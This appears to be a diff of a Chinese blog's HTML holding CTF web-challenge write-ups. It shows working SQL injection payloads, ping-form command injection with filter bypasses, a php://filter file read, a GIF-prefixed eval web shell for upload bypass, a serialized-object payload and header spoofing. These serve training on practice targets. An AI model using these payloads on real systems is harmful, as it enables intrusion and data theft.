+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119113449940.png" alt="image-20210119113449940" title="">
+                </div>
+                <div class="image-caption">image-20210119113449940</div>
+            </figure>
+
 <p>直接get传参试试，成了</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119113537553.png" alt="image-20210119113537553"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119113537553.png" alt="image-20210119113537553" title="">
+                </div>
+                <div class="image-caption">image-20210119113537553</div>
+            </figure>
+
 <h3 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h3><p>看wp，大佬直接盲猜SQL语句</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="variable">$_POST</span>[‘query’] || flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p>直接一把梭哈</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119125252021.png" alt="image-20210119125252021"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119125252021.png" alt="image-20210119125252021" title="">
+                </div>
+                <div class="image-caption">image-20210119125252021</div>
+            </figure>
+
 <p>下来是做法二：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;set sql_mode=PIPES_AS_CONCAT;select <span class="number">1</span></span><br></pre></td></tr></table></figure>
 
@@ -328,9 +675,23 @@
 <h3 id="极客大挑战-2019-Secret-File1"><a href="#极客大挑战-2019-Secret-File1" class="headerlink" title="[极客大挑战 2019]Secret File1"></a>[极客大挑战 2019]Secret File1</h3><p>首先看看源码，发现有个Archive_room.php</p>
 <p>访问，发现有一个按钮，是指向action.php，然后我们到了end.php</p>
 <p>这一步需要抓包</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119133101744.png" alt="image-20210119133101744"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119133101744.png" alt="image-20210119133101744" title="">
+                </div>
+                <div class="image-caption">image-20210119133101744</div>
+            </figure>
+
 <p>得到有一个secr3t.php</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119133123261.png" alt="image-20210119133123261"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210119133123261.png" alt="image-20210119133123261" title="">
+                </div>
+                <div class="image-caption">image-20210119133123261</div>
+            </figure>
+
 <p>得知flag在flag.php里面，还给了源码，代码审计，有一个include，文件包含</p>
 <p>然后发现过滤了一些伪协议，filter可以用，像上一道题目那样构造payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
@@ -365,25 +726,60 @@
 <p>首先ping本地（127.0.0.1）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121320469.png" alt="image-20210125121320469"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121320469.png" alt="image-20210125121320469" title="">
+                </div>
+                <div class="image-caption">image-20210125121320469</div>
+            </figure>
+
 <p>用管道符或者分号</p>
 <p>我们首先来尝试管道符</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>||ls </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121519587.png" alt="image-20210125121519587"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121519587.png" alt="image-20210125121519587" title="">
+                </div>
+                <div class="image-caption">image-20210125121519587</div>
+            </figure>
+
 <p>可以看到回显有两个文件，flag.php和index.php，显然我们是需要查看flag.php里面的内容，用linux里面的命令cat</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>||cat flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121706014.png" alt="image-20210125121706014"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125121706014.png" alt="image-20210125121706014" title="">
+                </div>
+                <div class="image-caption">image-20210125121706014</div>
+            </figure>
+
 <p>提示说空格问题，那么我们先绕过空格，方法是替换为其他可以代表空格的字符，例如</p>
 <p>${IFS}</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>||cat$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125122755896.png" alt="image-20210125122755896"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125122755896.png" alt="image-20210125122755896" title="">
+                </div>
+                <div class="image-caption">image-20210125122755896</div>
+            </figure>
+
 <p>提示说{}问题，那换一个</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>||cat$IFS$<span class="number">1</span>flag.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125123016168.png" alt="image-20210125123016168"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125123016168.png" alt="image-20210125123016168" title="">
+                </div>
+                <div class="image-caption">image-20210125123016168</div>
+            </figure>
+
 <p>flag被过滤了，我们尝试去看index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
 
@@ -391,21 +787,56 @@
 <p>常用的几种都过滤了，不过可以使用编码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>||`<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw$IFS$<span class="number">1</span>|$IFS$<span class="number">1</span>base64$IFS$<span class="number">1</span>-d`</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125125046345.png" alt="image-20210125125046345"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125125046345.png" alt="image-20210125125046345" title="">
+                </div>
+                <div class="image-caption">image-20210125125046345</div>
+            </figure>
+
 <h3 id="ACTF2020-新生赛-Exec1"><a href="#ACTF2020-新生赛-Exec1" class="headerlink" title="[ACTF2020 新生赛]Exec1"></a>[ACTF2020 新生赛]Exec1</h3><p>查看源码</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125140749109.png" alt="image-20210125140749109"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125140749109.png" alt="image-20210125140749109" title="">
+                </div>
+                <div class="image-caption">image-20210125140749109</div>
+            </figure>
+
 <p>这里我们可以看到命令执行的语句</p>
 <p>-c&lt;完成次数&gt; 设置完成要求回应的次数</p>
 <p>还是先和上面一样，稍有不同是这道题目使用了POST传参</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>||cat /flag</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125143053177.png" alt="image-20210125143053177"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210125143053177.png" alt="image-20210125143053177" title="">
+                </div>
+                <div class="image-caption">image-20210125143053177</div>
+            </figure>
+
 <h3 id="护网杯-2018-easy-tornado1"><a href="#护网杯-2018-easy-tornado1" class="headerlink" title="[护网杯 2018]easy_tornado1"></a>[护网杯 2018]easy_tornado1</h3><p>SSTI 服务端模板注入</p>
 <h3 id="极客大挑战-2019-Knife1"><a href="#极客大挑战-2019-Knife1" class="headerlink" title="[极客大挑战 2019]Knife1"></a>[极客大挑战 2019]Knife1</h3><p>这道题很简单，蚁剑或者菜刀直接连就可以</p>
 <p>密码就是Syc，也就是Post的变量</p>
 <p>然后返回最上层，就可以看到flag</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126120141053.png" alt="image-20210126120141053"></p>
-<h3 id="RoarCTF-2019-Easy-Calc1"><a href="#RoarCTF-2019-Easy-Calc1" class="headerlink" title="[RoarCTF 2019]Easy Calc1"></a>[RoarCTF 2019]Easy Calc1</h3><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126121719223.png" alt="image-20210126121719223"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126120141053.png" alt="image-20210126120141053" title="">
+                </div>
+                <div class="image-caption">image-20210126120141053</div>
+            </figure>
+
+<h3 id="RoarCTF-2019-Easy-Calc1"><a href="#RoarCTF-2019-Easy-Calc1" class="headerlink" title="[RoarCTF 2019]Easy Calc1"></a>[RoarCTF 2019]Easy Calc1</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126121719223.png" alt="image-20210126121719223" title="">
+                </div>
+                <div class="image-caption">image-20210126121719223</div>
+            </figure>
+
 <p>查看源码，发现调用了calc.php?num</p>
 <p>访问calc.php，直接给了源码，过滤了一些字符，没思路了，看wp</p>
 <p>是利用了php解析特性</p>
@@ -416,12 +847,26 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%<span class="number">20</span>num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure>
 
 <p>var_dump是打印参数内容，scandir是查看参数目录里的内容和目录，chr(47)就是”/“，”/“被过滤了，我们使用chr(47)绕过</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126122550522.png" alt="image-20210126122550522"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126122550522.png" alt="image-20210126122550522" title="">
+                </div>
+                <div class="image-caption">image-20210126122550522</div>
+            </figure>
+
 <p>可以看到有一个f1agg，我们查看它的内容</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%<span class="number">20</span>num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
 
 <p>file_get_contents是将整个文件读入一个字符串</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126123103847.png" alt="image-20210126123103847"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126123103847.png" alt="image-20210126123103847" title="">
+                </div>
+                <div class="image-caption">image-20210126123103847</div>
+            </figure>
+
 <h3 id="极客大挑战-2019-Http1"><a href="#极客大挑战-2019-Http1" class="headerlink" title="[极客大挑战 2019]Http1"></a>[极客大挑战 2019]Http1</h3><p>看源码，发现有个Secret.php</p>
 <p>访问，提示</p>
 <p>It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com&/#39;">https://www.Sycsecret.com&#39;</a></p>
@@ -432,7 +877,14 @@
 <p>XFF伪造</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:28669</span><br><span class="line">User-Agent: &quot;Syclover&quot; browser</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126125740291.png" alt="image-20210126125740291"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126125740291.png" alt="image-20210126125740291" title="">
+                </div>
+                <div class="image-caption">image-20210126125740291</div>
+            </figure>
+
 <h3 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h3><p>提示说有备份的习惯，扫一下目录，扫不出来。。。看wp</p>
 <p><a target="_blank" rel="noopener" href="http://www.zip下载下来,有个flag.php,里面是假的/">www.zip下载下来，有个flag.php，里面是假的</a></p>
 <p>看index.php，先include class.php，然后传参，反序列化</p>
@@ -453,61 +905,186 @@
 <p>字符串长度也包括所加前缀的长度</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126152717507.png" alt="image-20210126152717507"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126152717507.png" alt="image-20210126152717507" title="">
+                </div>
+                <div class="image-caption">image-20210126152717507</div>
+            </figure>
+
 <h3 id="极客大挑战-2019-Upload1"><a href="#极客大挑战-2019-Upload1" class="headerlink" title="[极客大挑战 2019]Upload1"></a>[极客大挑战 2019]Upload1</h3><p>文件上传</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF98a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>bp抓包修改</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126162204619.png" alt="image-20210126162204619"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126162204619.png" alt="image-20210126162204619" title="">
+                </div>
+                <div class="image-caption">image-20210126162204619</div>
+            </figure>
+
 <p>上传成功，在upload目录下</p>
 <p>蚁剑连接</p>
 <p>最上层找到flag</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126162254930.png" alt="image-20210126162254930"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210126162254930.png" alt="image-20210126162254930" title="">
+                </div>
+                <div class="image-caption">image-20210126162254930</div>
+            </figure>
+
+
+
 <h3 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=<span class="number">123</span> %<span class="number">27</span> ununionion seselectlect <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>在这里使用了双写绕过，猜测这里使用了replace，替换关键字为空</p>
 <p>总共有三列，并判断注入点为2，3</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201121853596.png" alt="image-20210201121853596"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201121853596.png" alt="image-20210201121853596" title="">
+                </div>
+                <div class="image-caption">image-20210201121853596</div>
+            </figure>
+
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=<span class="number">123</span> %<span class="number">27</span> ununionion seselectlect <span class="number">1</span>,<span class="number">2</span>,version() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>Maria DB下的一个函数，用来看版本</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201121815061.png" alt="image-20210201121815061"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201121815061.png" alt="image-20210201121815061" title="">
+                </div>
+                <div class="image-caption">image-20210201121815061</div>
+            </figure>
+
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=<span class="number">123</span>%<span class="number">20</span>%<span class="number">27</span>%<span class="number">20</span>ununionion%<span class="number">20</span>seselectlect%<span class="number">201</span>,<span class="number">2</span>,database()%<span class="number">20</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201122354943.png" alt="image-20210201122354943"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201122354943.png" alt="image-20210201122354943" title="">
+                </div>
+                <div class="image-caption">image-20210201122354943</div>
+            </figure>
+
 <p>这是当前连接的数据库的名字，我们还需要看一下所有的数据库</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=<span class="number">123</span>%<span class="number">20</span>%<span class="number">27</span>%<span class="number">20</span>ununionion%<span class="number">20</span>seselectlect%<span class="number">201</span>,<span class="number">2</span>,group_concat(schema_name)frfromom</span><br><span class="line">(infoorrmation_schema.schemata)%<span class="number">20</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\william\AppData\Roaming\Typora\typora-user-images\image-20210201125245104.png" alt="image-20210201125245104"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="C:\Users\william\AppData\Roaming\Typora\typora-user-images\image-20210201125245104.png" alt="image-20210201125245104" title="">
+                </div>
+                <div class="image-caption">image-20210201125245104</div>
+            </figure>
+
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=<span class="number">123</span>%<span class="number">20</span>%<span class="number">27</span>%<span class="number">20</span>ununionion%<span class="number">20</span>seselectlect%<span class="number">201</span>,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=<span class="string">&#x27;geek&#x27;</span>%<span class="number">20</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125426233.png" alt="image-20210201125426233"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125426233.png" alt="image-20210201125426233" title="">
+                </div>
+                <div class="image-caption">image-20210201125426233</div>
+            </figure>
+
 <p>再看一下ctf库</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125516753.png" alt="image-20210201125516753"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125516753.png" alt="image-20210201125516753" title="">
+                </div>
+                <div class="image-caption">image-20210201125516753</div>
+            </figure>
+
 <p>发现Flag表，爆字段</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=<span class="number">123</span>%<span class="number">20</span>%<span class="number">27</span>%<span class="number">20</span>ununionion%<span class="number">20</span>seselectlect%<span class="number">201</span>,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=<span class="string">&#x27;Flag&#x27;</span> %<span class="number">20</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125744633.png" alt="image-20210201125744633"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201125744633.png" alt="image-20210201125744633" title="">
+                </div>
+                <div class="image-caption">image-20210201125744633</div>
+            </figure>
+
 <p>flag字段里面看内容</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=<span class="number">123</span>%<span class="number">20</span>%<span class="number">27</span>%<span class="number">20</span>ununionion%<span class="number">20</span>seselectlect%<span class="number">201</span>,database(),group_concat(flag) frfromom ctf.Flag %<span class="number">20</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201130055891.png" alt="image-20210201130055891"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201130055891.png" alt="image-20210201130055891" title="">
+                </div>
+                <div class="image-caption">image-20210201130055891</div>
+            </figure>
+
+
+
 <h3 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h3><p>发现是文件上传</p>
 <p>提示说只能上传图片</p>
 <p>抓包修改后缀为phtml</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201132547431.png" alt="image-20210201132547431"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201132547431.png" alt="image-20210201132547431" title="">
+                </div>
+                <div class="image-caption">image-20210201132547431</div>
+            </figure>
+
 <p>得到路径，菜刀连接，得到flag</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201132615994.png" alt="image-20210201132615994"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201132615994.png" alt="image-20210201132615994" title="">
+                </div>
+                <div class="image-caption">image-20210201132615994</div>
+            </figure>
+
+
+
 <h3 id="ACTF2020-新生赛-BackupFile1"><a href="#ACTF2020-新生赛-BackupFile1" class="headerlink" title="[ACTF2020 新生赛]BackupFile1"></a>[ACTF2020 新生赛]BackupFile1</h3><p>根据题目提示下载备份文件，index.php.bak</p>
 <p>接下来代码审计，发现是弱类型比较</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201140346240.png" alt="image-20210201140346240"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/imgimage-20210201140346240.png" alt="image-20210201140346240" title="">
+                </div>
+                <div class="image-caption">image-20210201140346240</div>
+            </figure>
+
